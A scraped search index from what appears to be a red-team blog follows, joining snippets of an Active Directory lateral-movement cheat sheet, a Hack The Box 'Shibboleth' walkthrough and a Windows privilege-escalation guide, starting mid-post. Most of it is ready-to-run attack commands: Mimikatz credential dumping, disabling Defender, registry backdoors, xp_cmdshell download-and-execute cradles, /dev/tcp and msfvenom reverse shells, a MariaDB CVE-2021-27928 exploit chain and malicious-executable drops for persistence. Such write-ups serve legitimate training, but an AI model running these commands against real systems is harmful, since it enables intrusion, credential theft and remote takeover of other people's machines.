-Verbose2. Now we can execute ScriptBlock commands through Invoke-CommandInvoke-Command -ScriptBlock {whoami} -ComputerName &amp;lt;computer&amp;gt;3. On remote machine for userX without credentialsSet-RemotePSRemoting -UserName userX -ComputerName &amp;lt;computer&amp;gt; -Verbose4. On remote machine, remove the permissionsSet-RemotePSRemoting -UserName userX -ComputerName &amp;lt;computer&amp;gt; -RemoveAdd-RemoteRegBackdoor1. Using DAMP, with admin privs on remote machineAdd-RemoteRegBackdoor -ComputerName &amp;lt;computer&amp;gt; -Trustee user1 -VerboseRemoteHashRetrieval2. As student1, retrieve machine account hashGet-RemoteMachineAccountHash -ComputerName &amp;lt;computer&amp;gt; -Verbose If errors, replace $IV by $InitV in the script3 .Retrieve local account hashGet-RemoteLocalAccountHash -ComputerName &amp;lt;computer&amp;gt; -Verbose4. Retrieve domain cached credentialsGet-RemoteCachedCredential -ComputerName &amp;lt;computer&amp;gt; -VerboseTools Used Invoke-Mimikatz download from here : Invoke-Mimikatz PowerView download from here : powerview.ps1 PowerView Dev download from here : powerview.ps1 Set-RemoteWMI download from here : Set-RemoteWMI.ps1 Set-RemotePSRemoting download from here : Set-RemotePSRemoting.ps1 Add-RemoteRegBackdoor download from here : Add-RemoteRegBackdoor.ps1 RemoteHashRetrieval download from here : RemoteHashRetrieval.ps1If you find my articles interesting, you can buy me a coffee" }, { "title": "Active Directory - Lateral Movement", "url": "/posts/Active-Directory-Lateral-Movement/", "categories": "Red-Teaming, Active-Directory-Lateral-Movement", "tags": "active-directory, amsi-bypass, active-directory-lateral-movement, mimikatz, MSSQL, remoting", "date": "2022-04-08 13:25:00 +0530", "snippet": "IntroductionWelcome to my fourth article in the Red Teaming Series (Active Directory Lateral Movement). I hope everyone has gone through the previous articles of this series which go through the basic concepts required, high-level Domain enumeration explanation and AD/Windows Local Privilege escalation guide.If not so, you can give it a read from here.This guide explains Active-Directory Lateral Movement snippets mainly by using PowerShell cmdlets, Inkove-Mimikats and abusing MS-SQL servers in detail. I will also explain those terms that every pentester/red-teamer should control to understand the attacks performed in an Active Directory network. You may refer to this as a Cheat-Sheet also.I will continue to update this article with new lateral movement attacks. Throughout the article, I will use PowerView, Invoke-Mimikatz and PowerUpSQL.psd1 in performing the lateral movement on a Windows/Active Directory Environment. If any other tools are required, they will be mentioned along.What is Lateral MovementLateral movement is when an attacker leverages their current access rights to navigate around your environment. Privilege escalation, which I already covered, is gaining increased access permissions. Attackers combine these two tactics to achieve their ultimate goal of stealing data or doing other damage to your organization.PowerShell Remoting Think of it as psexec on steroids. You will found this increasingly used in enterprises. Enabled by default on Server 2012 onwards. You may need to enable remoting (Enable-PSRemoting) on a Desktop Windows machine, Admin privs are required to do that. You get elevated shell on remote system if admin creds are used to authenticate (which is the default setting). By default, enabling PowerShell remoting enables both an http and an https listener. The listeners run on default ports 5985 for http and 5986 for https.Powershell SessionsIn the table below, you can get a brief understanding of the working and usage of the cmdlets we will be using to perform attacks. Session Type Cmdlets Benifits One-to-One 1. New-PSSession 2. Enter-PSSession 1. Interactive 2. Runs in a new process (wsmprovhost) 3. Is Stateful One-to-Many 1. Invoke-Command 1. Non-interactive 2. Executes commands parallely 3. Execution is in disconnected sessions (v3) Use -Credential parameter to pass username/password$pass = ConvertTo-SecureString &quot;Password123!&quot; -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential(&quot;&amp;lt;computer-name&amp;gt;&quot;, $pass)Enter/New-PSSession Remoting1. Connect to a PS-Session of a remote userEnter-PSSession -Computername &amp;lt;computer-name&amp;gt; 2. Execute Stateful commands using Enter-PSSession ( persistence )$sess = New-PSSession -Computername &amp;lt;computer-name&amp;gt;Enter-PSSession -Session $sess[scorp.star.light.local]:PS&amp;gt; $proc = Get-Process[scorp.star.light.local]:PS&amp;gt; exitEnter-PSSession -Session $sess[scorp.star.light.local]:PS&amp;gt; procWill list current processInvoke-Command1. Execute Stateful commands using Invoke-Command ( persistence )$sess = New-PSSession -Computername &amp;lt;computer-name&amp;gt;Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}Invoke-Command -Session $sess -ScriptBlock {$proc.Name}2. Display allowed commands we can execute on remote machine# copy the command snippet with the parameters which are requiredInvoke-Command -computername &amp;lt;computer-name&amp;gt; -ConfigurationName &amp;lt;fill-if-required&amp;gt; -credential $cred -command {get-command}Invoke-Command -computername &amp;lt;computer-name&amp;gt; -credential $cred -command {get-command}Invoke-Command -computername &amp;lt;computer-name&amp;gt; -command {get-command}3. Write File using ScriptBlock# copy the command snippet with the parameters which are requiredInvoke-Command -ComputerName &amp;lt;computer-name&amp;gt; -ConfigurationName &amp;lt;fill-if-required&amp;gt; -Credential $cred -ScriptBlock {Set-Content -Path &#39;c:\\temp.bat&#39; -Value &#39;whoami&#39;}Invoke-Command -ComputerName &amp;lt;computer-name&amp;gt; -Credential $cred -ScriptBlock {Set-Content -Path &#39;c:\\temp.bat&#39; -Value &#39;whoami&#39;}Invoke-Command -ComputerName &amp;lt;computer-name&amp;gt; -ScriptBlock {Set-Content -Path &#39;c:\\temp.bat&#39; -Value &#39;whoami&#39;}4. Edit file using ScriptBlock# copy the command snippet with the parameters which are requiredInvoke-Command -computername &amp;lt;computer-name&amp;gt; -ConfigurationName &amp;lt;fill-if-required&amp;gt; -ScriptBlock {((cat &quot;c:\\mention\\path\\here&quot; -Raw) -replace &#39;replacing-object&#39;,&#39;replaced-with-content&#39;) | set-content -path c:\\mention\\same\\path\\here} -credential $credInvoke-Command -computername &amp;lt;computer-name&amp;gt; -ScriptBlock {((cat &quot;c:\\mention\\path\\here&quot; -Raw) -replace &#39;replacing-object&#39;,&#39;replaced-with-content&#39;) | set-content -path c:\\mention\\same\\path\\here} -credential $credInvoke-Command -computername &amp;lt;computer-name&amp;gt; -ScriptBlock {((cat &quot;c:\\mention\\path\\here&quot; -Raw) -replace &#39;replacing-object&#39;,&#39;replaced-with-content&#39;) | set-content -path c:\\mention\\same\\path\\here}5. Command execution using command and ScriptBlock# copy the command snippet with the parameters which are requiredInvoke-Command -computername &amp;lt;computer-name&amp;gt; -ConfigurationName &amp;lt;fill-if-required&amp;gt; -credential $cred -command {whoami}Invoke-Command -computername &amp;lt;computer-name&amp;gt; -ConfigurationName &amp;lt;fill-if-required&amp;gt; -credential $cred -ScriptBlock {whoami}Invoke-Command -computername &amp;lt;computer-name&amp;gt; -command {whoami}Invoke-Command -computername &amp;lt;computer-name&amp;gt; -ScriptBlock {whoami}6. File execution using ScriptBlock# copy the command snippet with the parameters which are requiredInvoke-Command -ComputerName &amp;lt;computer-name&amp;gt; -ConfigurationName &amp;lt;fill-if-required&amp;gt; -Credential $cred -ScriptBlock{&quot;C:\\temp\\mimikatz.exe&quot;}Invoke-Command -ComputerName &amp;lt;computer-name&amp;gt; -Credential $cred -ScriptBlock{&quot;C:\\temp\\mimikatz.exe&quot;}Invoke-Command -ComputerName &amp;lt;computer-name&amp;gt; -ScriptBlock{&quot;C:\\temp\\mimikatz.exe&quot;}7. File execution using FilePathInvoke-Command -computername &amp;lt;computer-name&amp;gt; -FilePath &quot;C:\\temp\\mimikatz.exe&quot;8. Language ModeInvoke-Command -computername &amp;lt;computer-name&amp;gt; -ScriptBlock {$ExecutionContext.SessionState.LanguageMode} If the value of the LanguageMode is Constrained, then it will only allow built-in cmdlets executionExecute locally loaded function on the remote machinesExample : Hello.ps1function hello{Write-Output &quot;Hello from the function&quot;}1. Now we can load the function on our machine. .\\Hello.ps12. Now we can execute the locally loaded functions Invoke-Command -ScriptBlock ${function:hello} -ComputerName &amp;lt;computer-name&amp;gt;3. In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this wayInvoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content &amp;lt;list of servers&amp;gt;) -ArgumentList4. Directly load function on the remote machines using FilePath$sess = New-PSSession -Computername &amp;lt;computer-name&amp;gt;Invoke-Command -FilePath &quot;C:\\temp\\hello.ps1&quot; -Session $sessEnter-PSSession -Session $sess[scorp.star.light.local]:PS&amp;gt; helloHello from the functionInvoke-Mimikatz The script could be used to dump credentials, tickets and more using mimikatz with PowerShell without dropping the mimikatz exe to disk. It is very useful for passing and replaying hashes, tickets and for many exciting Active Directory attacks. Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory. All the functions of mimikatz could be used from this script. The script needs administrative privileges for dumping credentials from local machine. Many attacks need specific privileges which are covered while discussing that attack.1. Dump credentials on a local machineInvoke-Mimikatz -DumpCreds2. Dump credentials on multiple remote machinesInvoke-Mimikatz -DumpCreds -ComputerName @(&quot;sys1&quot;,&quot;sys2&quot;) Invoke-Mimikatz uses PowerShell remoting cmdlet Invoke-Command to do above.3. ‚ÄúOver pass the hash‚Äù generate tokens from hashesInvoke-Mimikatz -Command &#39;&quot;sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:&amp;lt;ntImhash&amp;gt; /run:powershell.exe&quot;&#39;4. Create new session and dump hashes#Create a session for remoting system$sess = New-PSSession -ComputerName &amp;lt;computer-name&amp;gt;#Bypass AMSIInvoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; whoami} -Session $sess#Locally load mimikatz on your own systemImport-Module .\\Invoke-Mimikatz.ps1#Execute locally loaded functions remoting systemInvoke-Command -ScriptBlock ${function:Invoke-Mimikatz -command &#39;&quot;sekurlsa::logonpasswords&quot;&#39;} -Session $sessMS-SQL Enumeration - Part 1 MS SQL servers are generally deployed in plenty in a Windows domain. SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.For importing the script use the following commandImport-Module .\\PowerUpSQL.psd1Methodology/Steps 1. Check the SPN‚Äôs 2. Check which SPN‚Äôs you have access to 3. Check the Privileges you have of the above filtered SPN‚Äôs 4. Keep note of the Instance-Name, ServicePrincipalName and the DomainAccount-Name 5. If you find any service with higher privileges continue below to abuse itPowerUpSQL Enumeration1. Enumerate SPNGet-SQLInstanceDomain2. Check AccessGet-SQLConnectionTestThreadedGet-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose3. Check Privileges / Gather InfromationGet-SQLInstanceDomain | Get-SQLServerInfo -Verbose4. Check impersonation rights (extra)Invoke-SQLAudit -Verbose -Instance &amp;lt;instanceName&amp;gt;MS-SQL Abuse - Part 2 A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures. Database links work even across forest trusts.Execute commands on target server On the target server, either xp_cmdshell should be already enabled; or If rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:EXECUTE(&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;,1;reconfigure;&#39;) AT &quot;eu-sql&quot; If rpcout is disabled but we are sa, it can be enabled withEXEC sp_serveroption &#39;LinkedServer&#39;, &#39;rpc out&#39;, &#39;true&#39;;Methodology/Steps 1. Check the SQL Server link 2. Keep note if you have link to any other database in DatabaseLinkName 3. If SysAdmin:0 means that we will not be allowed to enable xp_cmdshell 4. Keep on enumerating and check all the linked databases you have access to 5. Now we can try to execute commands through out all the linked databases foundPowerUpSQL - Abusing the privileges1. Enumerate SQL Server linksGet-SQLServerLink -Instance &amp;lt;instanceName&amp;gt; -Verboseselect * from master..sysservers2. Enumerate DB linksGet-SQLServerLinkCrawl -Instance dcorp-mysql -Verboseselect * from openquery(&quot;&amp;lt;instanceName&amp;gt;&quot;,&#39;select * from openquery(&quot;&amp;lt;linkedInstance&amp;gt;&quot;,&#39;&#39;select * from master..sysservers&#39;&#39;)&#39;)3. Execute commands on target serverGet-SQLServerLinkCrawl -Instance dcorp-mysql -Query &quot;exec master..xp_cmdshell &#39;whoami&#39;&quot; | ftExtra Commands1. Download file on target serverGet-SQLServerLinkCrawl -Instance &amp;lt;instanceName&amp;gt; -Query &#39;exec master..xp_cmdshell &quot;powershell -c iex (new-object net.webclient).downloadstring(&#39;&#39;http://IP:8080/Invoke-HelloWorld.ps1&#39;&#39;,&#39;&#39;C:\\Windows\\Temp\\Invoke-HelloWorld.ps1&#39;&#39;)&quot;&#39;2. Impersonate an userInvoke-SQLAuditPrivImpersonateLogin -Instance &amp;lt;instanceName&amp;gt; -Exploit -Verbose#Then, we can EXECUTE AS, and chained the &#39;EXECUTE AS&#39;Get-SQLServerLinkCrawl -Verbose -Instance &amp;lt;instanceName&amp;gt; -Query &quot;EXECUTE AS LOGIN = &#39;dbuser&#39;; EXECUTE AS LOGIN = &#39;sa&#39;; EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;xp_cmdshell&#39;,1; RECONFIGURE; EXEC master..xp_cmdshell &#39;powershell -c iex (new-object net.webclient).downloadstring(&#39;&#39;http://IP/Invoke-HelloWorld.ps1&#39;&#39;)&#39;&quot;3. Basic SQL Server queries for DB enumerationAlso works with Get-SQLServerLinkCrawl#View all db in an instanceGet-SQLQuery -Instance &amp;lt;instanceName&amp;gt; -Query &quot;SELECT name FROM sys.databases&quot;#View all tablesGet-SQLQuery -Instance &amp;lt;instanceName&amp;gt; -Query &quot;SELECT * FROM dbName.INFORMATION_SCHEMA.TABLES&quot; #View all cols in all tables in a dbGet-SQLQuery -Instance &amp;lt;instanceName&amp;gt; -Query &quot;SELECT * FROM dbName.INFORMATION_SCHEMA.columns&quot;#View data in tableGet-SQLQuery -Instance &amp;lt;instanceName&amp;gt; -Query &quot;USE dbName;SELECT * FROM tableName&quot;Tools Used Invoke-Mimikatz download from here : Invoke-Mimikatz.ps1 PowerUpSQL download from here : PowerUpSQL.psd1 If you find my articles interesting, you can buy me a coffee" }, { "title": "Hack The Box - Shibboleth", "url": "/posts/HTB-Shibboleth/", "categories": "Hackthebox, Hackthebox-Linux, Hackthebox-Medium", "tags": "network, MariaDB, password-reuse, Internal, IPMI, CVE-Exploitation, CVE-2021-27928, Weak-Credentials", "date": "2022-04-05 08:47:00 +0530", "snippet": "Shibboleth is about enumerating the UDP ports through which we can find IPMI service is running. We can dump the administrator hashes and log in to one of Shibboleth‚Äôs subdomains, where we can get RCE and an initial shell as Zabbix. With password reuse, we can move laterally to ipmi-svc. To root the box, it‚Äôs a simple RCE on an outdated version of MySQL.ReconNmapThe first thing that I do is run nmap scan enumerating tcp and udp that show this results :0xStarlight@kali$ nmap -sC -sV -Pn 10.10.11.124 -vv &amp;gt; nmap_tcp_scan.conf0xStarlight@kali$ nmap -sC -sV -sU -Pn 10.10.11.124 -vv &amp;gt; nmap_udp_scan.conf0xStarlight@kali$ cat nmap_tcp_scan.conf nmap_udp_scan.conf[SNIP...]PORT STATE SERVICE REASON VERSION80/tcp open tcpwrapped syn-ack| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://shibboleth.htb/|PORT STATE SERVICE VERSION623/udp open asf-rmcp1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port623-UDP:V=7.91%I=7%D=1/15%Time=61E2A6CF%P=x86_64-pc-linux-gnu%r(ipmSF:i-rmcp,1E,&quot;\\x06\\0\\xff\\x07\\0\\0\\0\\0\\0\\0\\0\\0\\0\\x10\\x81\\x1cc\\x20\\x008\\0\\x01SF:\\x97\\x04\\x03\\0\\0\\0\\0\\t&quot;);From the Nmap results, we can see that there is port 80, which is a web service apache 2.4.41, is running on the server with a hostname of shibboleth.htb. So we can add it to our /etc/hosts file.On port 623, we can see the asf-rmcp service running. UDP IPMI service on port 623 is a quick way of discovering BMCs on the network.shibboleth.htb - TCP 80Upon visiting the site, it seems to be made out of bootstrap. It has a few pages visible on the top. There is also a contact form which returns an error when submitted.I tried feroxbuster, but no interesting page was returned to me. At the bottom of the page, we can view how the server is hosted.Powered by enterprise monitoring solutions based on Zabbix and Bare Metal BMC automation.Doing a lot of research on Bare Metal BMC displays many references about IPMI.Subdomain FuzzingThe next thing I tried was subdomain fuzzing using ffuf. I‚Äôll start the scan and immediately kill it, then use the -fw tag to hide all the pages redirecting me to status 302 with word 18.0xStarlight@kali$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://shibboleth.htb/ -H &quot;Host: FUZZ.shibboleth.htb&quot; -fw 18 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://shibboleth.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.shibboleth.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 18________________________________________________monitor [Status: 200, Size: 3684, Words: 192, Lines: 30]monitoring [Status: 200, Size: 3684, Words: 192, Lines: 30]zabbix [Status: 200, Size: 3684, Words: 192, Lines: 30]I‚Äôll add each of those to /etc/hosts as well:10.10.11.124 shibboleth.htb monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htbmonitor.shibboleth.htb - TCP 80We can see ZABBIX is running on this subdomain upon visiting the site. At the bottom, we can see the copyright till 2021. So this means we could be an outdated service abuse. Since we saw from shibboleth.htb is powered by Bare Metal BMC automation, there could be a chance that we could abuse IMPI to get a valid login credential to log in.IMPI - UDP 623One of the blogs, I read while researching stated that Most BMCs expose some form of web-based management, a command-line interface such as Telnet or Secure Shell, and the IPMI network protocol on port 623 (UDP and sometimes TCP).The article on Hacktricks demonstrated the exploitation of IMPI and dumping of the users hashes.Basically, you can ask the server for the hashes MD5 and SHA1 of any username and if the username exists those hashes will be sent back. Yeah, as amazing as it sounds. And there is a metasploit module for testing this.msf &amp;gt; use auxiliary/scanner/ipmi/ipmi_dumphashesmsf &amp;gt; set rhosts 10.10.11.124msf &amp;gt; exploit[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:2b68c64d82280000a8c1a7e2d84aba3e0410df33d1bf8d7f39a69fefdb2a49b26877364dbe132618a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:b2726f78047e0ccb5324cb8a4701686d29ad00a5Now we have the administrators hash. we can crack the hash using hashcat and try to login using the found credentials.0xStarlight@kali$ hashcat -m 7300 hash /home/kali/rockyou.txtpassword : ilovepumkinpie1Shell as ZabbixGreat, now we have Administrator user valid credentials. Useraname Password Administrator ilovepumkinpie1 We can go back to monitor.shibboleth.htb and log in as Administrator.The end of the dashboard page displays the version of Zabbix, i.e., Zabbix 5.0.17. ¬© 2001‚Äì2021, Zabbix SIA. I tried to google if there were any documents or any pre available exploits for the version Zabbix is running on.After a lot of digging, I couldn‚Äôt find any pre available exploits for abusing Zabbix 5.0.17. Still, on reading the documentation of the Zabbix agent, the system data command mentioned that it was possible for command execution using the system.run[command,&amp;lt;mode&amp;gt;] function.Let‚Äôs try it out. First, set a listener on our machine.0xStarlight@kali$ sudo rlwrap nc -lnvp 8888Navigate to the following ‚Äì&amp;gt; Configurations &amp;gt; Host &amp;gt; Items &amp;gt; create itemWe can inject our payload for a reverse shell into the key value and then test the value to execute the command.system.run[/bin/bash -c &quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.x.x/8888 0&amp;gt;&amp;amp;1&quot;,nowait]Shell as ipmi-svcAfter receiving a reverse shell from Zabbix, we can make it into a stable shell to work on it more efficiently.zabbix@shibboleth:/$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;I identified another user on the machine, ipmi-svc. Since we already have a credential found, we can try to use that to elevate to that user.zabbix@shibboleth:/$ su ipmi-svcpassword : ilovepumkinpie1ipmi-svc@shibboleth:/$ whoami;idipmi-svcuid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)EnumerationThe first thing I checked was Zabbix config file stored as /etc/zabbix/ to check if there would be any other user‚Äôs credentials hardcoded into it, which we may use for privilege escalation.ipmi-svc@shibboleth:/$ grep -iR &#39;password&#39; /etc/zabbix/ 2&amp;gt;/dev/nullFurther reading the file, we can find the username and the password to access Zabbix‚Äôs database server. Useraname DBUser DBPassword zabbix zabbix bloooarskybluh I also ran linpeas on another shell to check if it returned anything interesting. It displayed MySQL is running on the machine on port 3306.Shell as RootWe can log in to the MYSQL databases server with the above credential.ipmi-svc@shibboleth:/$ mysql -u zabbix -p -D zabbixpassword : bloooarskybluhReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -AWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 17592Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement.MariaDB [zabbix]&amp;gt; On reading the server version, it‚Äôs currently running on MariaDB 10.3.25, an older version of MariaDB. Doing a quick google search, I found out it was vulnerable to remote code execution, which would give us privileged access as root user using CVE-2021-27928.Using the CVE we can craft our payload and get root access.Local MachineCreate the reverse shell payload and start the listener.0xStarlight@kali$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.x.x LPORT=9999 -f elf-so -o shell.so0xStarlight@kali$ sudo rlwrap nc -lnvp 9999We can start a python server so we can transfer the file on ipmi-svc using wget.0xStarlight@kali$ python3 -m http.server 80ipmi-svc MachineTransfer the file, execute the payload and check on the listening listener to get a shell as root.ipmi-svc@shibboleth:/$ wget http://10.10.x.x/shell.so -o /tmp/shell.soipmi-svc@shibboleth:/$ mysql -u zabbix -p -D zabbix -e &#39;SET GLOBAL wsrep_provider=&quot;/tmp/shell.so&quot;;&#39;password : bloooarskybluhBox RootedHTB Profile : 0xStarlightIf you find my articles interesting, you can buy me a coffee" }, { "title": "Active Directory - Local Privilege Escalation", "url": "/posts/Active-Directory-Windows-Local-Priv-Esc/", "categories": "Red-Teaming, Active-Directory-Local-Privilege-Escalation", "tags": "active-directory-local-privilege-escalation, windows-local-privilege-escalation", "date": "2022-04-01 06:56:00 +0530", "snippet": "IntroductionWelcome to my third article in the Red Teaming Series (Active Directory Local Privilege Escalation). I hope everyone has gone through the first two articles of this series which go through the basic concepts required to understand Active Directory and high-level Domain enumeration explanation.If not so, you can give it a read from here.This guide aims to explain Windows/Active-Directory Local Privilege escalation snippets mainly by abusing services, registries, tokens and groups etc., in detail. I will also explain those terms that every pentester/red-teamer should control to understand the attacks performed in an Active Directory network. You may refer to this as a Cheat-Sheet also.I will continue to update this article with new privilege escalation vectors. Throughout the article, I will use PowerView, winPEAS, AccessChk and PowerUp in performing local privilege escalation on an Windows/Active Directory Environment. If any other tools are required, they will be mentioned along.What is Privilege EscalationPrivilege escalation exploits a bug, a design flaw, or a configuration oversight in an operating system or software application to gain elevated access to resources that are generally protected from an application or user.Now that you know the meaning of privilege escalation, we can dive right into the techniques for escalation.AutorunMethodologyAutorun is a type of Registry Escalation.To ensure that the IT department creates a secure environment, Windows administrators often need to know what kind of access specific users or groups have to resources, including files, directories, Registry keys, global objects, and Windows services. AccessChk quickly answers these questions with an intuitive interface and output.So basically, we can say a particular application in a specific directory gets automatically executed with administrator privileges once he logs on. This can be abused by finding the path location and dropping our malicious executable file through which we will gain administrator access.DetectionUsing Autoruns and AccessChk Transfer Autoruns64.exe on the Windows/AD machine and execute it on cmd C:\\Temp&amp;gt; Autoruns64.exe In Autoruns, click on the &quot;Logon&quot; tab. From the listed results, notice that the &quot;My Program&quot; entry is pointing to &quot;C:\\Program Files\\Autorun Program\\program.exe&quot;. Go back to the command prompt run AccessChk64.exeC:\\Temp&amp;gt; accesschk64.exe -wvu &quot;C:\\Program Files\\Autorun Program&quot;# Switch meaning# w --&amp;gt; only show items that have write access# v --&amp;gt; verbose; dispaly as many details as possible# u --&amp;gt; ignore the errorsUsing PowerUp Run PowerUp and Run Invoke-AllChecks (check the autoruns field)C:\\Temp&amp;gt; powershell -ep bypassPS C:\\Temp&amp;gt;. .\\PowerUp.sp1PS C:\\Temp&amp;gt; Invoke-AllChecksFrom the output, notice that the &quot;Everyone&quot; user group has &quot;FILE_ALL_ACCESS&quot; permission on the &quot;program.exe&quot; file. To gain administrator access, we can drop our malicious executable file by overwriting on the file.ExploitationKali VM Start a netcat listener $ sudo nc -nvlp 53 Open an additional command prompt and type: $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o program.exe Transfer the generated file, program.exe, to the Windows VM.Windows VM replace program.exe in &#39;C:\\Program Files\\Autorun Program&#39;Kali VM Wait for a reverse shell on your kali machine.AlwaysInstallElevatedMethodologyAlwaysInstallElevated is a type of Registry Escalation.This option is equivalent to granting full administrative rights, which can pose a massive security risk. Microsoft strongly discourages the use of this setting.To install a package with elevated (system) privileges, set the AlwaysInstallElevated value to ‚Äú1‚Äù under both of the following registry keys:HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\InstallerHKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\InstallerIf the AlwaysInstallElevated value is not set to ‚Äú1‚Äù under both of the preceding registry keys, the installer uses elevated privileges to install managed applications and uses the current user‚Äôs privilege level for unmanaged applications.DetectionWindows VM Open command prompt and type: C:\\Temp&amp;gt; reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer 0x1 means its ON In command prompt type: C:\\Temp&amp;gt;reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer 0x1 means its ON From the both output, we notice that ‚ÄúAlwaysInstallElevated‚Äù value is 1. Hence, we can abuse this function to get privilege escalation.Using PowerUp Run Powerup.ps1 and Run Invoke-AllChecks (check the AlwaysInstallElevated field) C:\\Temp&amp;gt; powershell -ep bypassPS C:\\Temp&amp;gt;. .\\PowerUp.sp1PS C:\\Temp&amp;gt; Invoke-AllChecks Run Write-UserAddMSI and Add backdoor user in Administrators group (Required RDP access) Check local Administrators C:\\Temp&amp;gt; net localgroup administrators# now backdoor is added to the localgroup administrators group ExploitationKali VM Start a netcat listener $ sudo nc -nvlp 53 Open an additional command prompt and type: $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f msi -o setup.msi Copy the generated file, setup.msi, to the Windows VM.Windows VM Place &#39;setup.msi&#39; in &#39;C:\\Temp&#39; Open command prompt and type: C:\\Temp&amp;gt; msiexec /quiet /qn /i C:\\Temp\\setup.msi Kali VM Wait for a reverse shell on your kali machine.Service RegistryMethodologyA service registry consists of a cluster of servers that use a replication protocol to maintain consistency. Hence if we get Full Contol permission over the registry key, we can drop our malicious executable file to gain administrator access.DetectionWindows VM Open powershell prompt and type: C:\\Temp&amp;gt; powershell -ep bypassPS C:\\Temp&amp;gt; Get-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvc | fl Notice that the output suggests that user belong to &quot;NT AUTHORITY\\INTERACTIVE&quot; has &quot;FullContol&quot; permission over the registry key.ExploitationKali VM Start a netcat listener $ sudo nc -nvlp 53 Open an additional command prompt and type: $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o x.exe Copy the generated file x.exe, to the Windows VM.Windows VM Place x.exe in &#39;C:\\Temp&#39; Open command prompt at type: C:\\Temp&amp;gt; reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\\temp\\x.exe /f In the command prompt type: C:\\Temp&amp;gt; sc start regsvc# If it doesnt work try restaring the service and perform the exploit egain Kali VM Wait for a reverse shell on your kali machine.Executable FilesMethodologyMicrosoft Windows services, formerly known as NT services, enable you to create long-running executable applications that run in their own Windows sessions. These services can be automatically started when the computer boots, can be paused and restarted, and do not show any user interface.Hence if we get Full Contol permission over the file path location, we can drop our malicious executable file to gain administrator access.Detection Run Powerup.ps1 and Run Invoke-AllChecks (check the service executable field) C:\\Temp&amp;gt; powershell -ep bypassPS C:\\Temp&amp;gt;. .\\PowerUp.sp1PS C:\\Temp&amp;gt; Invoke-AllChecks We can see that we have Modifiable File access to &quot;c:\\Program Files\\File Permissions Service\\filepermservice.exe&quot;. To gain administrator access, we can drop our malicious executable file on this location.ExploitationKali VM Start a netcat listener $ sudo nc -nvlp 53 Open an additional command prompt and type: $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o x.exe Copy the generated file x.exe, to the Windows VM and replace it over filepermsvc.exe.Windows VM In command prompt type: C:\\Temp&amp;gt; sc start filepermsvc Kali VM Wait for a reverse shell on your kali machine.Startup ApplicationsMethodologyStartup apps run in the background, the number of apps running on the system can be significantly more than what the user is aware of and affect system responsiveness. Startup apps are classified to include those leveraging these mechanisms to start: Run registry keys (HKLM, HKCU, wow64 nodes included) RunOnce registry keys Startup folders under the start menu for per user and public locationsSo basically, we need full access to the Startup folder. Then by dropping our malicious executable file, we will gain administrator access.DetectionWindows VM Open command prompt and type: C:\\Temp&amp;gt; icacls.exe &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&quot; From the output notice that the &quot;BUILTIN\\Users&quot; group has full access &#39;(F)&#39; to the directory.ExploitationKali VM Start a netcat listener $ sudo nc -nvlp 53 Open an additional command prompt and type: $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o y.exe Copy the generated file, y.exe, to the 